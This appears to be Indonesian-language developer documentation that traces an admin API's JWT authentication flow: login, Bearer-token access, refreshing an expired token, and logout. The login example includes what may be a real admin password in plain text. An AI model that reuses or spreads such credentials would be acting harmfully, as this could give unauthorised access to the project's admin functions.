## Alur Lengkap: Dari Login Sampai Akses Data

```
LANGKAH 1 — LOGIN
════════════════════════════════════════════════════════

Admin buka Postman:
  POST /api/admin/auth/login
  Body: { "username": "admin", "password": "fordza2026" }

        │
        ▼ masuk ke login/route.ts

1. Ambil username & password dari body request
2. Cari admin di database berdasarkan username
   → AdminService.findByUsername("admin")
   → Ketemu! { id: "cmk123", username: "admin", password: "$2a$12$..." }

3. Cocokkan password
   → auth.ts → verifyPassword("fordza2026", "$2a$12$...")
   → Hasilnya: TRUE ✅

4. Bikin 2 token
   → auth.ts → signAccessToken({ id: "cmk123", username: "admin" })
   → Hasilnya: "eyJ...ACCESS..." (berlaku 15 menit)

   → auth.ts → signRefreshToken({ id: "cmk123", username: "admin" })
   → Hasilnya: "eyJ...REFRESH..." (berlaku 7 hari)

5. Set cookie & kirim response
   → auth.ts → getAccessCookieConfig("eyJ...ACCESS...")
   → auth.ts → getRefreshCookieConfig("eyJ...REFRESH...")
   → response.cookies.set(...)

RESPONSE ke admin:
  {
    "success": true,
    "data": {
      "accessToken": "eyJ...ACCESS...",     ← copy ini untuk Postman
      "refreshToken": "eyJ...REFRESH...",   ← simpan ini
    }
  }
  + Cookie: access_token=eyJ...ACCESS...    ← otomatis di browser
  + Cookie: refresh_token=eyJ...REFRESH...  ← otomatis di browser


LANGKAH 2 — AKSES DATA PRODUK
════════════════════════════════════════════════════════

Admin di Postman:
  GET /api/admin/products
  Header: Authorization: Bearer eyJ...ACCESS...

        │
        ▼ PERTAMA masuk ke middleware.ts

1. Cek: route dimulai /api/admin? → YA, lanjut cek
2. Cek: route = /login atau /refresh? → BUKAN, perlu auth
3. Ambil token dari:
   - Cookie "access_token" → TIDAK ADA (Postman tidak kirim cookie)
   - Header "Authorization: Bearer ..." → ADA! ✅
4. Verify token pakai jwtVerify (fungsi dari jose, sama yang di auth.ts)
   Hasil: { id: "cmk123", username: "admin", type: "access" }
5. Cek type === "access"? → YA ✅
6. LANJUTKAN ke route handler

        │
        ▼ masuk ke admin/products/route.ts

7. Panggil ProductService.getAllAdmin() → query database
8. Return data produk ke admin


LANGKAH 3 — TOKEN EXPIRED (15 menit kemudian)
════════════════════════════════════════════════════════

Admin di Postman:
  GET /api/admin/products
  Header: Authorization: Bearer eyJ...ACCESS... (token lama)

        │
        ▼ middleware.ts

1. Verify token → GAGAL! field "exp" < waktu sekarang
2. Return: 401 "Access token expired"

Admin harus refresh:
  POST /api/admin/auth/refresh
  Body: { "refreshToken": "eyJ...REFRESH..." }

        │
        ▼ refresh/route.ts

1. auth.ts → verifyToken("eyJ...REFRESH...")
   Hasil: { id: "cmk123", type: "refresh" } ✅ (masih valid, berlaku 7 hari)
2. Cek type === "refresh"? → YA ✅
3. auth.ts → signAccessToken({ id: "cmk123", username: "admin" })
   Hasil: "eyJ...ACCESS_BARU..." (berlaku 15 menit lagi)
4. Return access token baru

RESPONSE:
  { "data": { "accessToken": "eyJ...ACCESS_BARU..." } }

Sekarang pakai token baru ini untuk request selanjutnya.


LANGKAH 4 — LOGOUT
════════════════════════════════════════════════════════

Admin di Postman:
  POST /api/admin/auth/logout

        │
        ▼ logout/route.ts

1. auth.ts → getLogoutCookieConfigs()
   Return: [
     { name: "access_token", value: "", maxAge: 0 },
     { name: "refresh_token", value: "", maxAge: 0 }
   ]
2. Set kedua cookie tersebut
   → Browser menerima cookie dengan maxAge: 0
   → Browser HAPUS kedua cookie

Admin sekarang tidak punya token.
Harus login ulang untuk akses admin.
```
